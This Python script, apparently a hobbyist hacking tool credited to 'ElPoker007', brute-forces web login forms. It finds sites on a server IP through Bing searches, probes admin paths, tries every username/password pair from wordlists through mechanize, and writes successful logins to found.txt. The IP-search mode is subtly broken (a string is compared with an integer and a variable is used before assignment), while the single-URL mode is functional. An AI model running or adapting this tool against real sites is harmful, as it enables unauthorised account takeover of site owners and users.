import requests
from termcolor import colored
from mechanize import Browser
from bs4 import BeautifulSoup
import http.cookiejar as cookielib
import mechanize
logo = """

███████╗██╗     ██████╗  ██████╗ ██╗  ██╗███████╗██████╗  ██████╗  ██████╗ ███████╗
██╔════╝██║     ██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗██╔═████╗██╔═████╗╚════██║
█████╗  ██║     ██████╔╝██║   ██║█████╔╝ █████╗  ██████╔╝██║██╔██║██║██╔██║    ██╔╝
██╔══╝  ██║     ██╔═══╝ ██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗████╔╝██║████╔╝██║   ██╔╝ 
███████╗███████╗██║     ╚██████╔╝██║  ██╗███████╗██║  ██║╚██████╔╝╚██████╔╝   ██║  
╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝  
                                                                                   

"""
print(colored(logo,"red"))
print(colored("My Channel : https://www.youtube.com/channel/UCkmU73jmY7TFUEYF0OGMQFQ", 'blue'))
print(colored("My Github : https://github.com/ElPoker007", 'blue'))
print("\n")
try:
    userq = input(colored("Enter Your User List ===> ","red"))
    userw = open(userq,"r")
    user = userw.readlines()
    pasq = input(colored("Enter Your Wordlist ===> ","red"))
    pasw = open(pasq,"r")
    pas = pasw.readlines()
    path = open("paths.txt","r")
    paths = path.readlines()
except FileNotFoundError:
    print(colored("File Not Found","red"))
    exit()
except KeyboardInterrupt:
    print("\n")
    print(colored("Bye !","red"))
    exit()
    
br = Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
uu = []
links = []
headers = {'User-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.3'}
oo = 2
kk = str(oo)+"0"
page = 0
print(colored("1 For Server Ip | 2 For Website Url","red"))
cho = input(colored("Enter Your Choice ==> ","red"))

if cho == 1:
    while page <= int(kk)-10:
        qq = requests.get("http://www.bing.com/search?q=ip%3a+"+str(xx.strip())+"&first="+str(page),headers=headers)
        sp = str(qq.content)
        rr = len(sp.split('href="'))
        for ss in range(1,rr):
            results = sp.split('href="')[ss]
            result = results.find('"')
            if "http" not in str(results[:result]) or "microsoft" in str(results[:result]):
                pass
            else:
                links.append(str(results[:result]))
        page +=10
    xx = input(colored("Enter Your Ip ===> ","red"))
    for link in links:
        zz = link.find("/", 8)
        if str(link[:zz+1]) not in uu:
            uu.append(str(link[:zz+1]))
            content = "ss"
            for url in paths:
                reu = requests.get(str(link[:zz])+str(url.strip()),headers=headers)
                #print(str(link[:zz].strip())+str(url.strip()) + " " , int(reu.status_code) )
                if int(reu.status_code) == 200:
                    if content != str(reu.content):
                        content = str(reu.content)
                    else:
                        pass
                    num = 0
                    form = 0
                    print(colored("Trying Site ====> " + str(link[:zz])+str(url.strip())))
                    
                    for users in user:
                        for pasw in pas:
                            try:
                                br.open(str(link[:zz])+str(url.strip()))
                                print(colored("Trying ====> " + str(users.strip()) + ":" + str(pasw.strip()),"yellow"))
                                br.select_form(nr=form)
                                br.find_control(nr=num).value = str(users.strip())
                                br.find_control(nr=num+1).value = str(pasw.strip())
                                br.submit()
                                if str(br.geturl().strip()) != str(link[:zz])+ str(url.strip()) and content not in str(br.response().read()) :
                                    kk = open("found.txt","a")
                                    kk.write(str(users.strip())+":"+str(pasw.strip())+ " " +str(link[:zz]) +str(url.strip()))
                                    kk.write("\n")
                                    kk.close()
                                    print(colored("Sucess ====> " + str(users.strip())+":"+str(pasw.strip())+ " " +str(link[:zz])+str(url.strip()),"green"))
                                    print(colored("Saved In found.txt","yellow"))
                            
                                else:
                                    pass
                            except mechanize._mechanize.FormNotFoundError:
                                form+=1
                            except mechanize._form_controls.ControlNotFoundError:
                                num+=1
                            except KeyboardInterrupt:
                                print("\n")
                                print(colored("Bye !","red"))
                                exit()
                            except:
                                pass 
                        
                        
                else:
                    pass
elif cho == "2":
    
    link = input("Enter Your WebSite ===> ")
    if "http" not in str(link):
        print("please enter your url")
        exit()
    content = "ss"
    reu = requests.get(str(link.strip()),headers=headers)
    #print(str(link[:zz].strip())+str(url.strip()) + " " , int(reu.status_code) )
    if content != str(reu.content):
        content = str(reu.content)
    num = 0
    form = 0
    
    for users in user:
        for pasw in pas:
            try:
                br.open(str(link.strip()))
                print(colored("Trying ====> " + str(users.strip()) + ":" + str(pasw.strip()),"yellow"))
                br.select_form(nr=form)
                br.find_control(nr=num).value = str(users.strip())
                br.find_control(nr=num+1).value = str(pasw.strip())
                br.submit()
                if str(br.geturl().strip()) != str(link.strip()) and content not in str(br.response().read()) :
                    kk = open("found.txt","a")
                    kk.write(str(users.strip())+":"+str(pasw.strip())+ " " + str(link.strip()))
                    kk.write("\n")
                    kk.close()
                    print(colored("Sucess ====> " + str(users.strip())+":"+str(pasw.strip()),"green"))
                    print(colored("Saved In found.txt","yellow"))
            
                else:
                    pass
            except mechanize._mechanize.FormNotFoundError:
                form+=1
            except mechanize._form_controls.ControlNotFoundError:
                num+=1
            except KeyboardInterrupt:
                print("\n")
                print(colored("Bye !","red"))
                exit()
            except:
                pass 
